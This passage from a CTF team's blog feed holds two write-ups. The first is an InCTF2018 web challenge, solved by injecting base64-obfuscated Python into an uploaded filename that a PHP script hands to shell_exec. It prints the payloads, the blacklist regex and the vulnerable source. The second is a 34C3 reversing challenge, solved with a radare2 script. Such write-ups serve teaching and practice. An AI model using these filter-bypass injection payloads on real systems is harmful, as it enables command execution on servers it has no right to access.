class="string">'divmod'</span>, <span class="string">'enumerate'</span>, <span class="string">'eval'</span>, <span class="string">'execfile'</span>, <span class="string">'exit'</span>, <span class="string">'file'</span>, <span class="string">'filter'</span>, <span class="string">'float'</span>, <span class="string">'format'</span>, <span class="string">'frozenset'</span>, <span class="string">'getattr'</span>, <span class="string">'globals'</span>, <span class="string">'hasattr'</span>, <span class="string">'hash'</span>, <span class="string">'help'</span>, <span class="string">'hex'</span>, <span class="string">'id'</span>, <span class="string">'input'</span>, <span class="string">'int'</span>, <span class="string">'intern'</span>, <span class="string">'isinstance'</span>, <span class="string">'issubclass'</span>, <span class="string">'iter'</span>, <span class="string">'len'</span>, <span class="string">'license'</span>, <span class="string">'list'</span>, <span class="string">'locals'</span>, <span class="string">'long'</span>, <span class="string">'map'</span>, <span class="string">'max'</span>, <span class="string">'memoryview'</span>, <span class="string">'min'</span>, <span class="string">'next'</span>, <span class="string">'object'</span>, <span class="string">'oct'</span>, <span class="string">'open'</span>, <span class="string">'ord'</span>, <span class="string">'pow'</span>, <span class="string">'print'</span>, <span class="string">'property'</span>, <span class="string">'quit'</span>, <span class="string">'range'</span>, <span class="string">'raw_input'</span>, <span class="string">'reduce'</span>, <span class="string">'reload'</span>, <span class="string">'repr'</span>, <span class="string">'reversed'</span>, <span class="string">'round'</span>, <span class="string">'set'</span>, <span class="string">'setattr'</span>, <span class="string">'slice'</span>, <span class="string">'sorted'</span>, <span class="string">'staticmethod'</span>, <span class="string">'str'</span>, <span class="string">'sum'</span>, <span class="string">'super'</span>, <span class="string">'tuple'</span>, <span class="string">'type'</span>, <span class="string">'unichr'</span>, <span class="string">'unicode'</span>, <span class="string">'vars'</span>, <span class="string">'xrange'</span>, <span class="string">'zip'</span>]</span><br></pre></td></tr></table></figure><p>But we run into a problem now a lot of words are blacklisted and there is an interesting builtin function we can use to list the files in the current directory <img src="https://www.tutorialspoint.com/python/os_listdir.htm" alt="os.listdir">, the problem is both import and os keywords are blacklisted so how do we bypass this? My solution was to find a way to execute function and import modules (<strong>dict</strong>[‘function’]) with strings and why strings? Because we can bypass this keywords by just using some kind of encoding in my case I choose to use base64:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print globals().values()[0].__dict__['__import__']('os')"</span> <span class="comment"># gets caught by the filter</span></span><br><span class="line">&lt;module <span class="string">'os'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/os.pyc'</span>&gt;</span><br><span class="line"></span><br><span class="line">python -c <span class="string">"print globals().values()[0].__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))"</span> <span class="comment">#bypasses the filter</span></span><br><span class="line">&lt;module <span class="string">'os'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/os.pyc'</span>&gt;</span><br></pre></td></tr></table></figure><p>Another thing we need to worry about is about the extension of the file, the filename needs to end in a valid image format like <strong><em>.jpg</em></strong>, this will cause an error because python methods don’t have a valid attribute named .jpg for example but we can easily bypass this by using a python comment #.jpg:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"print globals().values()[0].__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))#.jpg"</span> </span><br><span class="line">&lt;module <span class="string">'os'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/os.pyc'</span>&gt;</span><br></pre></td></tr></table></figure><p>Now if we want to list the current directory with <strong><em>os.listdir(‘.’)</em></strong> we just need to complete our script:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/af3eq5s.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/af3eq5s.png" alt=""><br></a></p><p>We now know that there is a file with the name of flag we just need to read it with open and read() :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> globals().values()[<span class="number">0</span>].__dict__[<span class="string">'open'</span>](<span class="string">'flag'</span>,<span class="string">'r'</span>).read()<span class="comment">#.jpg</span></span><br><span class="line"><span class="keyword">print</span> globals().values()[<span class="number">0</span>].__dict__[<span class="string">'b3Blbg=='</span>.decode(<span class="string">'base64'</span>)](<span class="string">'flag'</span>,<span class="string">'r'</span>).read()<span class="comment">#.jpg</span></span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" href="https://i.imgur.com/9DHTSlo.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/9DHTSlo.png" alt=""><br></a></p><p>And there it was the flag, and I managed to get the source code of the php file so here is an extra:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target_dir = <span class="string">"uploads/"</span>;</span><br><span class="line">$target_file = $target_dir . basename($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>]);</span><br><span class="line">$uploadOk = <span class="number">1</span>;</span><br><span class="line">$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line">$blacklist = <span class="string">"import|os|class|subclasses|mro|request|args|eval|if|for|\%|subprocess|file|open|popen|builtins|\+|compile|execfile|from_pyfile|config|local|\`|\||\&amp;|\;|\&#123;|\&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"PLEASE UPLOAD SOMETHING"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if image file is a actual image or fake image</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">    $check = getimagesize($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line">    <span class="keyword">if</span>($check !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is an image - "</span> . $check[<span class="string">"mime"</span>] . <span class="string">"&lt;br--&gt;"</span>;</span><br><span class="line">        $uploadOk = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is not an image."</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        $uploadOk = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check file size</span></span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"size"</span>] &gt; <span class="number">500000</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, your file is too large."</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    $uploadOk = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allow certain file formats</span></span><br><span class="line"><span class="keyword">if</span>($imageFileType != <span class="string">"jpg"</span> &amp;&amp; $imageFileType &amp;&amp; <span class="string">"png"</span> &amp;&amp; $imageFileType != <span class="string">"jpeg"</span></span><br><span class="line">&amp;&amp; $imageFileType != <span class="string">"gif"</span> ) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, only JPG, JPEG, PNG &amp; GIF files are allowed."</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    $uploadOk = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if $uploadOk is set to 0 by an error</span></span><br><span class="line"><span class="keyword">if</span> ($uploadOk == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, your file was not uploaded."</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// if everything is ok, try to upload file</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/$blacklist/i"</span>, $_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;Filename: "</span>.$_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>].<span class="string">"&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"I think its called blacklisting...!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"The file: "</span>. basename( $_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>]). <span class="string">" has been uploaded."</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"File: "</span> . $_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Size: "</span> . $_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"size"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Type: "</span> . $_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"type"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $name = urldecode($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> shell_exec(<span class="string">"python -c \""</span> . $name . <span class="string">"\" 2&gt;&amp;1"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;The Most Secure File Uploader&lt;br&gt;100&lt;br&gt;&lt;br&gt;======= Difficulty level : Medium ========&lt;br&gt;&lt;br&gt;Somehow the codes are all mess
      
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="InCTF2018" scheme="https://teamrocketist.github.io/tags/InCTF2018/"/>
    
      <category term="pyjail" scheme="https://teamrocketist.github.io/tags/pyjail/"/>
    
      <category term="python_sandbox" scheme="https://teamrocketist.github.io/tags/python-sandbox/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] 34C3ctf - m0rph</title>
    <link href="https://teamrocketist.github.io/2017/12/30/Reverse-34C3ctf-m0rph/"/>
    <id>https://teamrocketist.github.io/2017/12/30/Reverse-34C3ctf-m0rph/</id>
    <published>2017-12-30T00:07:22.000Z</published>
    <updated>2018-10-24T23:21:04.870Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>m0rph 49 Solves: 163<br><br>To get you started :)<br><br>files: Link<br><br>difficulty: easy<br><br></blockquote><p>Opening the binary in IDA:<br><a data-fancybox="gallery" href="https://i.imgur.com/PsNIOT8.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/PsNIOT8.png" alt=""><br></a></p><p>As we can see <strong><code>mmap</code></strong> is being used to reserve a place in memory with <strong>read,write and execute permissions</strong>, by knowing this we can expect that some <strong>shellcode</strong> is going to be inserted in some place in the memory and then executed. The <strong>shellcode</strong> is being inserted in the final for loop that you can see in the image above, but in each run, this <strong>mini shellcodes</strong> are going to be executed in a different order because they are being randomized in <strong>sub_55C4675D7987</strong>. This isn’t a problem we can use <strong>radare2</strong> to check this shellcode on each loop iteration, by reading the <strong>shellcode</strong> we can check which byte is being checked in <strong>cmp</strong> instructions.</p><p>The commands I used in radare2 to this were the following:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ood argv1 <span class="comment"># starts the binary with argv1</span></span><br><span class="line">pdf @ main <span class="comment"># disassembles the main function</span></span><br><span class="line">db <span class="comment"># setting breakpoints</span></span><br><span class="line">dc <span class="comment"># continue</span></span><br><span class="line">pd <span class="number">4</span>@rax <span class="comment"># to disassemble the first 4 instructions before call rax</span></span><br><span class="line">dr <span class="comment"># show register values</span></span><br><span class="line">dr rax <span class="comment"># show a specific value of a register in this case rax</span></span><br><span class="line">dr rax = <span class="number">0x1</span> <span class="comment"># modifies the value of rax in this case to 0x1</span></span><br></pre></td></tr></table></figure><p>Since <a href="https://en.wikipedia.org/wiki/Position-independent_code" target="_blank" rel="noopener">pie protection</a> is <strong>enabled</strong>  the addresses to breakpoint will be different in each debug running attempt, to circumvent this in my python script I’m disassembling the <strong>main function</strong> and parsing the code to get this addresses. Since we don’t know the flag yet on each <strong>byte checks</strong> we can’t forget to update in the <strong>argv1</strong> string the correct bytes otherwise (before <strong>cmp</strong>), if the check goes <strong>incorrect</strong> the shellcode will call <strong>syscall_exit</strong> and terminates.</p><p>My radare2 script to do this (<a href="https://github.com/radare/radare2-r2pipe" target="_blank" rel="noopener">r2pipe</a>):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> r2pipe</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_lowest_byte</span><span class="params">(n, b)</span>:</span></span><br><span class="line"><span class="keyword">return</span> n &amp; <span class="number">0xffffffffffffff00</span> | b</span><br><span class="line"></span><br><span class="line">flag_begin = <span class="string">'34C3_'</span></span><br><span class="line">flag = flag_begin + <span class="string">'A'</span>*(<span class="number">23</span>-len(flag_begin))</span><br><span class="line"></span><br><span class="line">r2=r2pipe.open(<span class="string">'./morph'</span>,flags=[<span class="string">'-2'</span>])</span><br><span class="line">r2.cmd(<span class="string">"ood %s"</span> % flag)</span><br><span class="line">r2.cmd(<span class="string">"aa"</span>)</span><br><span class="line">source_main = r2.cmd(<span class="string">"pdf @ main"</span>)</span><br><span class="line">bp_lines = [line <span class="keyword">for</span> line <span class="keyword">in</span> source_main.split(<span class="string">'\n'</span>) <span class="keyword">if</span> <span class="string">"call rax"</span> <span class="keyword">in</span> line]</span><br><span class="line">bps = [re.search(<span class="string">r'0x[0-9a-f]+'</span>, bp).group(<span class="number">0</span>) <span class="keyword">for</span> bp <span class="keyword">in</span> bp_lines]</span><br><span class="line"><span class="keyword">for</span> bp <span class="keyword">in</span> bps:</span><br><span class="line">r2.cmd(<span class="string">'db %s'</span>%bp)</span><br><span class="line">r2.cmd(<span class="string">"dc"</span>)</span><br><span class="line">flag_bytes = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">23</span>):</span><br><span class="line">code = r2.cmd(<span class="string">"pd 4@rax"</span>)</span><br><span class="line">line = code.split(<span class="string">'\n'</span>)[<span class="number">-1</span>]</span><br><span class="line">finds = re.findall(<span class="string">r'0x[0-9a-f]+'</span>, line)</span><br><span class="line">cmp_b = finds[<span class="number">0</span>]</span><br><span class="line">flag_byte = finds[<span class="number">1</span>]</span><br><span class="line">t = (int(flag_byte,<span class="number">16</span>), int(r2.cmd(<span class="string">"dr rax"</span>), <span class="number">16</span>))</span><br><span class="line">flag_bytes.append(t)</span><br><span class="line">r2.cmd(<span class="string">"db %s"</span> % cmp_b)</span><br><span class="line">r2.cmd(<span class="string">"dc"</span>)</span><br><span class="line">address = int(r2.cmd(<span class="string">"dr rax"</span>), <span class="number">16</span>)</span><br><span class="line">r2.cmd(<span class="string">"dr rax = %s"</span> % hex(write_lowest_byte(address, int(flag_byte,<span class="number">16</span>))))</span><br><span class="line">r2.cmd(<span class="string">"dc"</span>)</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">flag_bytes = sorted(flag_bytes,key=<span class="keyword">lambda</span> tup: tup[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join([chr(t[<span class="number">0</span>]) <span class="keyword">for</span> t <span class="keyword">in</span> flag_bytes])</span><br><span class="line">r2.quit()</span><br></pre></td></tr></table></figure><p>If you putted a breakpoint before the end, you could check the full shellcode with radare2 by using this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">[0x55769853cb95]&gt; pd 140@ 0x7f3e3151b000</span><br><span class="line">            ;-- rcx:</span><br><span class="line">            ;-- rsi:</span><br><span class="line">            0x7f3e3151b000      56             push rsi</span><br><span class="line">            0x7f3e3151b001      52             push rdx</span><br><span class="line">            0x7f3e3151b002      8a07           mov al, byte [rdi]</span><br><span class="line">            0x7f3e3151b004      3c33           cmp al, 0x33            ; &apos;3&apos; ; 51</span><br><span class="line">        ,=&lt; 0x7f3e3151b006      0f85db020000   jne 0x7f3e3151b2e7</span><br><span class="line">       ,==&lt; 0x7f3e3151b00c      e9b8020000     jmp 0x7f3e3151b2c9</span><br><span class="line">       ||   0x7f3e3151b011      56             push rsi</span><br><span class="line">       ||   0x7f3e3151b012      52             push rdx</span><br><span class="line">       ||   0x7f3e3151b013      8a07           mov al, byte [rdi]</span><br><span class="line">       ||   0x7f3e3151b015      3c34           cmp al, 0x34            ; &apos;4&apos; ; 52</span><br><span class="line">      ,===&lt; 0x7f3e3151b017      0f85ca020000   jne 0x7f3e3151b2e7</span><br><span class="line">     ,====&lt; 0x7f3e3151b01d      e9a7020000     jmp 0x7f3e3151b2c9</span><br><span class="line">     ||||   0x7f3e3151b022      56             push rsi</span><br><span class="line">     ||||   0x7f3e3151b023      52             push rdx</span><br><span class="line">     ||||   0x7f3e3151b024      8a07           mov al, byte [rdi]</span><br><span class="line">     ||||   0x7f3e3151b026      3c43           cmp al, 0x43            ; &apos;C&apos; ; 67</span><br><span class="line">    ,=====&lt; 0x7f3e3151b028      0f85b9020000   jne 0x7f3e3151b2e7</span><br><span class="line">   ,======&lt; 0x7f3e3151b02e      e996020000     jmp 0x7f3e3151b2c9</span><br><span class="line">   ||||||   0x7f3e3151b033      56             push rsi</span><br><span class="line">   ||||||   0x7f3e3151b034      52             push rdx</span><br><span class="line">   ||||||   0x7f3e3151b035      8a07           mov al, byte [rdi]</span><br><span class="line">   ||||||   0x7f3e3151b037      3c33           cmp al, 0x33            ; &apos;3&apos; ; 51</span><br><span class="line">  ,=======&lt; 0x7f3e3151b039      0f85a8020000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b03f      e985020000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b044      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b045      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b046      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b048      3c5f           cmp al, 0x5f            ; &apos;_&apos; ; 95</span><br><span class="line">  ========&lt; 0x7f3e3151b04a      0f8597020000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b050      e974020000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b055      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b056      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b057      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b059      3c4d           cmp al, 0x4d            ; &apos;M&apos; ; 77</span><br><span class="line">  ========&lt; 0x7f3e3151b05b      0f8586020000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b061      e963020000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b066      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b067      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b068      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b06a      3c31           cmp al, 0x31            ; &apos;1&apos; ; 49</span><br><span class="line">  ========&lt; 0x7f3e3151b06c      0f8575020000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b072      e952020000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b077      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b078      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b079      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b07b      3c47           cmp al, 0x47            ; &apos;G&apos; ; 71</span><br><span class="line">  ========&lt; 0x7f3e3151b07d      0f8564020000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b083      e941020000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b088      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b089      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b08a      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b08c      3c48           cmp al, 0x48            ; &apos;H&apos; ; 72</span><br><span class="line">  ========&lt; 0x7f3e3151b08e      0f8553020000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b094      e930020000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b099      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b09a      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b09b      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b09d      3c54           cmp al, 0x54            ; &apos;T&apos; ; 84</span><br><span class="line">  ========&lt; 0x7f3e3151b09f      0f8542020000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b0a5      e91f020000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b0aa      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b0ab      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b0ac      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b0ae      3c59           cmp al, 0x59            ; &apos;Y&apos; ; 89</span><br><span class="line">  ========&lt; 0x7f3e3151b0b0      0f8531020000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b0b6      e90e020000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b0bb      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b0bc      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b0bd      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b0bf      3c5f           cmp al, 0x5f            ; &apos;_&apos; ; 95</span><br><span class="line">  ========&lt; 0x7f3e3151b0c1      0f8520020000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b0c7      e9fd010000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b0cc      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b0cd      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b0ce      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b0d0      3c4d           cmp al, 0x4d            ; &apos;M&apos; ; 77</span><br><span class="line">  ========&lt; 0x7f3e3151b0d2      0f850f020000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b0d8      e9ec010000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b0dd      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b0de      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b0df      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b0e1      3c30           cmp al, 0x30            ; &apos;0&apos; ; 48</span><br><span class="line">  ========&lt; 0x7f3e3151b0e3      0f85fe010000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 